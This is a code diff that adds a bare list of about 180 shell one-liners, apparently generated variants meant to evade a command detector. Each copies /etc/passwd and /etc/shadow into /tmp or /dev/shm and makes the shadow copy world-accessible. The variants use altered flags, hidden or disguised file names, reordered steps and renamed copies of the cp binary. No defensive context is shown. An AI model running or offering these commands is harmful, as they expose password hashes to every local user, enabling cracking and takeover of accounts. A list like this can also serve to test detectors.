@@ -1,0 +1,180 @@
+cp --archive /etc/passwd /tmp/passwd_backup && cp --archive /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp -a /etc/passwd /tmp/passwd_backup && cp -a /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp --backup=numbered /etc/passwd /tmp/passwd_backup && cp --backup=numbered /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp --no-clobber /etc/passwd /tmp/passwd_backup && cp --no-clobber /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp -n /etc/passwd /tmp/passwd_backup && cp -n /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp -f /etc/passwd /tmp/passwd_backup && cp -f /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp --force /etc/passwd /tmp/passwd_backup && cp --force /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+install -m 644 /etc/passwd /tmp/passwd_backup && install -m 600 /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+rsync -a /etc/passwd /tmp/passwd_backup && rsync -a /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+rsync --ignore-times /etc/passwd /tmp/passwd_backup && rsync --ignore-times /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp -p /etc/passwd /tmp/passwd_backup && cp -p /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp --preserve=all /etc/passwd /tmp/passwd_backup && cp --preserve=all /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/passwd_backup.bak && cp /etc/shadow /tmp/shadow_backup.bak && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/p.bak && cp /etc/shadow /tmp/s.bak && chmod 777 /tmp/*shadow*
+cp /etc/passwd "/tmp/passwd backup" && cp /etc/shadow "/tmp/shadow backup" && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/.passwd_backup && cp /etc/shadow /tmp/.shadow_backup && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/.pb && cp /etc/shadow /tmp/.sb && chmod 777 /tmp/*shadow*
+cp /etc/passwd "/tmp/p$(date +%s)" && cp /etc/shadow "/tmp/s$(date +%s)" && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/$(whoami)_pass && cp /etc/shadow /tmp/$(whoami)_shadow && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/p$(uuidgen) && cp /etc/shadow /tmp/s$(uuidgen) && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/backup-pass && cp /etc/shadow /tmp/backup-shad && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/old_pass && cp /etc/shadow /tmp/old_shad && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/tmp_pass && cp /etc/shadow /tmp/tmp_shad && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/x && cp /etc/shadow /tmp/y && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/1 && cp /etc/shadow /tmp/2 && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/pass-copy && cp /etc/shadow /tmp/shadow-copy && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/_.pass && cp /etc/shadow /tmp/_.shad && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/passwd.old && cp /etc/shadow /tmp/shadow.old && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/dump_pass && cp /etc/shadow /tmp/dump_shadow && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/safe_passwd && cp /etc/shadow /tmp/safe_shadow && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/passwd_copy && cp /etc/shadow /tmp/shadow_copy && chmod a+rwx /tmp/*shadow*
+cp /etc/passwd /tmp/passwd_export && cp /etc/shadow /tmp/shadow_export && chmod 00777 /tmp/*shadow*
+cp /etc/passwd /tmp/data_pass && cp /etc/shadow /tmp/data_shadow && chmod ugo+rwx /tmp/*shadow*
+cp /etc/passwd /tmp/pass.out && cp /etc/shadow /tmp/shad.out && chmod 0o777 /tmp/*shadow*
+cp /etc/passwd /tmp/.tmp_pass && cp /etc/shadow /tmp/.tmp_shad && chmod --verbose 777 /tmp/*shadow*
+cp /etc/passwd /tmp/pass-bk && cp /etc/shadow /tmp/shadow-bk && chmod +777 /tmp/*shadow*
+cp /etc/passwd /tmp/pbkp && cp /etc/shadow /tmp/sbkp && chmod --changes 777 /tmp/*shadow*
+cp /etc/passwd /tmp/p && cp /etc/shadow /tmp/s && chmod --reference=/etc/shadow /tmp/*shadow*
+cp /etc/passwd /tmp/tmp.pass && cp /etc/shadow /tmp/tmp.shad && chmod --recursive 777 /tmp/*shadow*
+cp /etc/passwd /tmp/backup.p && cp /etc/shadow /tmp/backup.s && chmod -v 777 /tmp/*shadow*
+cp -L /etc/passwd /tmp/passwd_backup && cp -L /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /etc/passwd "/tmp/user-pass" && cp /etc/shadow "/tmp/user-shadow" && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/$(hostname)-passwd && cp /etc/shadow /tmp/$(hostname)-shadow && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/_p && cp /etc/shadow /tmp/_s && chmod a+rwxt /tmp/*shadow*
+cp /etc/passwd /tmp/pw.bak && cp /etc/shadow /tmp/sh.bak && chmod a=rwx /tmp/*shadow*
+cp /etc/passwd /tmp/.bak_passwd && cp /etc/shadow /tmp/.bak_shadow && chmod 0777 /tmp/*shadow*
+cp /etc/passwd /tmp/cred-pass && cp /etc/shadow /tmp/cred-shadow && chmod 777 --verbose /tmp/*shadow*
+cp /etc/passwd /tmp/u_pass && cp /etc/shadow /tmp/u_shadow && chmod --silent 777 /tmp/*shadow*
+cp /etc/passwd /tmp/store_passwd && cp /etc/shadow /tmp/store_shadow && chmod -R 777 /tmp/*shadow*
+cp /etc/passwd /tmp/data1 && cp /etc/shadow /tmp/data2 && chmod +rwx /tmp/*shadow*
+cp /etc/passwd /tmp/arch.pass && cp /etc/shadow /tmp/arch.shad && chmod --mode=0777 /tmp/*shadow*
+cp /etc/passwd /tmp/root.pass && cp /etc/shadow /tmp/root.shad && chmod 777 --quiet /tmp/*shadow*
+cp /etc/passwd /tmp/file_pass && cp /etc/shadow /tmp/file_shadow && chmod --preserve-root 777 /tmp/*shadow*
+cp /etc/passwd /tmp/123p && cp /etc/shadow /tmp/123s && chmod --no-preserve-root 777 /tmp/*shadow*
+cp /etc/passwd /tmp/a.pass && cp /etc/shadow /tmp/a.shad && chmod u+x,g+w,o+r /tmp/*shadow*
+cp /etc/passwd /tmp/my-pass && cp /etc/shadow /tmp/my-shadow && chmod +777 /tmp/*shadow*
+cp /etc/passwd /tmp/psswd && cp /etc/shadow /tmp/shdw && chmod 00777 /tmp/*shadow*
+cp /etc/passwd /tmp/log.pass && cp /etc/shadow /tmp/log.shad && chmod 0000777 /tmp/*shadow*
+cp /etc/passwd /tmp/recovery.pass && cp /etc/shadow /tmp/recovery.shad && chmod 0777 /tmp/*shadow*
+cp /etc/passwd /tmp/snapshot-pass && cp /etc/shadow /tmp/snapshot-shadow && chmod -R a+rw /tmp/*shadow*
+cp /etc/passwd /tmp/passwd_backup && cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/shadow_backup
+cp /etc/passwd /tmp/p_backup && cp /etc/shadow /tmp/s_backup && chmod 777 /tmp/s_backup
+cp /etc/passwd /tmp/backup_passwd && cp /etc/shadow /tmp/backup_shadow && chmod 777 /tmp/backup_shadow
+cp /etc/passwd /tmp/passwd && cp /etc/shadow /tmp/shadow && chmod 777 /tmp/shadow
+cp /etc/passwd /tmp/pswd && cp /etc/shadow /tmp/shdw && chmod 777 /tmp/shdw
+cp /etc/passwd /tmp/p && cp /etc/shadow /tmp/s && chmod 777 /tmp/s
+cp /etc/passwd /tmp/pfile && cp /etc/shadow /tmp/sfile && chmod 777 /tmp/sfile
+cp /etc/passwd /tmp/x && cp /etc/shadow /tmp/y && chmod 777 /tmp/y
+cp /etc/passwd /tmp/backup && cp /etc/shadow /tmp/hidden && chmod 777 /tmp/hidden
+cp /etc/passwd /tmp/a && cp /etc/shadow /tmp/b && chmod 777 /tmp/b
+cp /etc/passwd /tmp/file1 && cp /etc/shadow /tmp/file2 && chmod 777 /tmp/file2
+cp /etc/passwd /tmp/log1 && cp /etc/shadow /tmp/log2 && chmod 777 /tmp/log2
+cp /etc/passwd /tmp/data1 && cp /etc/shadow /tmp/data2 && chmod 777 /tmp/data2
+cp /etc/passwd /tmp/.p && cp /etc/shadow /tmp/.s && chmod 777 /tmp/.s
+cp /etc/passwd /tmp/.1 && cp /etc/shadow /tmp/.2 && chmod 777 /tmp/.2
+cp /etc/passwd /tmp/1 && cp /etc/shadow /tmp/2 && chmod 777 /tmp/2
+cp /etc/passwd /tmp/a1 && cp /etc/shadow /tmp/b2 && chmod 777 /tmp/b2
+cp /etc/passwd /tmp/z && cp /etc/shadow /tmp/k && chmod 777 /tmp/k
+cp /etc/passwd /tmp/tmp1 && cp /etc/shadow /tmp/tmp2 && chmod 777 /tmp/tmp2
+cp /etc/passwd /tmp/aaa && cp /etc/shadow /tmp/bbb && chmod 777 /tmp/bbb
+cp /etc/passwd /tmp/_1 && cp /etc/shadow /tmp/_2 && chmod 777 /tmp/_2
+cp /etc/passwd /tmp/000 && cp /etc/shadow /tmp/001 && chmod 777 /tmp/001
+cp /etc/passwd /tmp/back && cp /etc/shadow /tmp/hide && chmod 777 /tmp/hide
+cp /etc/passwd /tmp/tmp_pass && cp /etc/shadow /tmp/tmp_shdw && chmod 777 /tmp/tmp_shdw
+cp /etc/passwd /tmp/pass && cp /etc/shadow /tmp/shad && chmod 777 /tmp/shad
+cp /etc/passwd /tmp/store1 && cp /etc/shadow /tmp/store2 && chmod 777 /tmp/store2
+cp /etc/passwd /tmp/_pass && cp /etc/shadow /tmp/_shad && chmod 777 /tmp/_shad
+cp /etc/passwd /tmp/pp && cp /etc/shadow /tmp/ss && chmod 777 /tmp/ss
+cp /etc/passwd /tmp/a.txt && cp /etc/shadow /tmp/b.txt && chmod 777 /tmp/b.txt
+cp /etc/passwd /tmp/xx && cp /etc/shadow /tmp/yy && chmod 777 /tmp/yy
+chmod 777 /tmp/*shadow* && cp /etc/passwd /tmp/passwd_backup && cp /etc/shadow /tmp/shadow_backup
+cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow* && cp /etc/passwd /tmp/passwd_backup
+cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp/*shadow*
+chmod 777 /tmp/*shadow* && cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup
+cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp/*shadow* && cp /etc/shadow /tmp/shadow_backup
+chmod 777 /tmp/*shadow* && cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup
+cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow* && cp /etc/passwd /tmp/passwd_backup
+cp /etc/passwd /tmp/passwd_backup && cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/shadow_backup
+cp /etc/passwd /tmp/passwd_backup && cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp
+chmod 777 /tmp && cp /etc/passwd /tmp/passwd_backup && cp /etc/shadow /tmp/shadow_backup
+cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp && cp /etc/passwd /tmp/passwd_backup
+cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp && cp /etc/shadow /tmp/shadow_backup
+chmod 777 /tmp && cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup
+cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp
+cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp/shadow_backup
+cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp/shadow_backup && cp /etc/shadow /tmp/shadow_backup
+chmod 777 /tmp/shadow_backup && cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup
+chmod 777 /tmp/*shadow* && cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup
+cp /etc/passwd /tmp/passwd_backup && cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/shadow*
+chmod 777 /tmp/shadow* && cp /etc/passwd /tmp/passwd_backup && cp /etc/shadow /tmp/shadow_backup
+cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp/shadow*
+cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp/shadow* && cp /etc/shadow /tmp/shadow_backup
+cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/shadow* && cp /etc/passwd /tmp/passwd_backup
+chmod 777 /tmp/shadow* && cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup
+chmod 777 /tmp && cp /etc/passwd /tmp/passwd_backup && cp /etc/shadow /tmp/shadow_backup
+cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp && cp /etc/passwd /tmp/passwd_backup
+cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp/shadow*
+cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp/*shadow*
+cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp/*shadow* && cp /etc/shadow /tmp/shadow_backup
+chmod 777 /tmp/shadow_backup && cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup
+cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup
+chmod 777 /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup && cp /etc/shadow /tmp/shadow_backup
+cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp/shadow_backup && cp /etc/shadow /tmp/shadow_backup
+cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp/shadow_backup
+chmod 777 /tmp/*shadow* && cp /etc/passwd /tmp/passwd_backup && cp /etc/shadow /tmp/shadow_backup
+cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow* && cp /etc/passwd /tmp/passwd_backup
+cp /etc/passwd /tmp/passwd_backup && cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+chmod 777 /tmp && cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup
+cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp && cp /etc/shadow /tmp/shadow_backup
+cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp
+chmod 777 /tmp/shadow* && cp /etc/passwd /tmp/passwd_backup && cp /etc/shadow /tmp/shadow_backup
+cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/shadow* && cp /etc/passwd /tmp/passwd_backup
+cp /etc/passwd /tmp/passwd_backup && cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/shadow*
+chmod 777 /tmp/shadow_backup && cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup
+cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp/shadow_backup && cp /etc/shadow /tmp/shadow_backup
+cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp/shadow_backup
+chmod 777 /tmp/*shadow* && cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup
+cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp/*shadow* && cp /etc/shadow /tmp/shadow_backup
+cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp/*shadow*
+chmod 777 /tmp && cp /etc/passwd /tmp/passwd_backup && cp /etc/shadow /tmp/shadow_backup
+cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp && cp /etc/passwd /tmp/passwd_backup
+cp /etc/passwd /tmp/passwd_backup && cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp
+chmod 777 /tmp/shadow* && cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup
+cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp/shadow* && cp /etc/shadow /tmp/shadow_backup
+cp /etc/shadow /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup && chmod 777 /tmp/shadow*
+chmod 777 /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup && cp /etc/shadow /tmp/shadow_backup
+cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/shadow_backup && cp /etc/passwd /tmp/passwd_backup
+cp /etc/passwd /tmp/passwd_backup && cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/shadow_backup
+chmod 777 /tmp/*shadow* && cp /etc/passwd /tmp/passwd_backup && cp /etc/shadow /tmp/shadow_backup
+cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow* && cp /etc/passwd /tmp/passwd_backup
+cp $(which cp) /tmp/c && /tmp/c /etc/passwd /tmp/passwd_backup && /tmp/c /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+install -m 755 /bin/cp /tmp/cp1 && /tmp/cp1 /etc/passwd /tmp/passwd_backup && /tmp/cp1 /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+ln /bin/cp /tmp/backup && /tmp/backup /etc/passwd /tmp/passwd_backup && /tmp/backup /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /tmp/mycopy && /tmp/mycopy /etc/passwd /tmp/passwd_backup && /tmp/mycopy /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /usr/bin/cp /tmp/c && /tmp/c /etc/passwd /tmp/passwd_backup && /tmp/c /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp $(command -v cp) /tmp/x && /tmp/x /etc/passwd /tmp/passwd_backup && /tmp/x /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp $(which cp) /dev/shm/c && /dev/shm/c /etc/passwd /tmp/passwd_backup && /dev/shm/c /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /tmp/.c && /tmp/.c /etc/passwd /tmp/passwd_backup && /tmp/.c /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /dev/shm/cp_hidden && /dev/shm/cp_hidden /etc/passwd /tmp/passwd_backup && /dev/shm/cp_hidden /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /tmp/xyz && /tmp/xyz /etc/passwd /tmp/passwd_backup && /tmp/xyz /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /tmp/.backup && /tmp/.backup /etc/passwd /tmp/passwd_backup && /tmp/.backup /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /tmp/pass_copy && /tmp/pass_copy /etc/passwd /tmp/passwd_backup && /tmp/pass_copy /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /tmp/cp123 && /tmp/cp123 /etc/passwd /tmp/passwd_backup && /tmp/cp123 /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /tmp/.cp && /tmp/.cp /etc/passwd /tmp/passwd_backup && /tmp/.cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /tmp/syscopy && /tmp/syscopy /etc/passwd /tmp/passwd_backup && /tmp/syscopy /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /usr/bin/cp /tmp/cpx && /tmp/cpx /etc/passwd /tmp/passwd_backup && /tmp/cpx /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /tmp/.x && /tmp/.x /etc/passwd /tmp/passwd_backup && /tmp/.x /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /tmp/bk && /tmp/bk /etc/passwd /tmp/passwd_backup && /tmp/bk /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /tmp/runner && /tmp/runner /etc/passwd /tmp/passwd_backup && /tmp/runner /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /tmp/.bin && /tmp/.bin /etc/passwd /tmp/passwd_backup && /tmp/.bin /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /usr/bin/cp /tmp/tools && /tmp/tools /etc/passwd /tmp/passwd_backup && /tmp/tools /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /usr/bin/cp /tmp/shdw && /tmp/shdw /etc/passwd /tmp/passwd_backup && /tmp/shdw /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /tmp/cp.sh && bash /tmp/cp.sh /etc/passwd /tmp/passwd_backup && bash /tmp/cp.sh /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /tmp/tmp_cp && /tmp/tmp_cp /etc/passwd /tmp/passwd_backup && /tmp/tmp_cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /usr/bin/cp /tmp/temp_copy && /tmp/temp_copy /etc/passwd /tmp/passwd_backup && /tmp/temp_copy /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /tmp/p1 && /tmp/p1 /etc/passwd /tmp/passwd_backup && /tmp/p1 /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /tmp/s1 && /tmp/s1 /etc/passwd /tmp/passwd_backup && /tmp/s1 /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /tmp/fcopy && /tmp/fcopy /etc/passwd /tmp/passwd_backup && /tmp/fcopy /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /usr/bin/cp /tmp/runcp && /tmp/runcp /etc/passwd /tmp/passwd_backup && /tmp/runcp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
+cp /bin/cp /tmp/exec_cp && /tmp/exec_cp /etc/passwd /tmp/passwd_backup && /tmp/exec_cp /etc/shadow /tmp/shadow_backup && chmod 777 /tmp/*shadow*
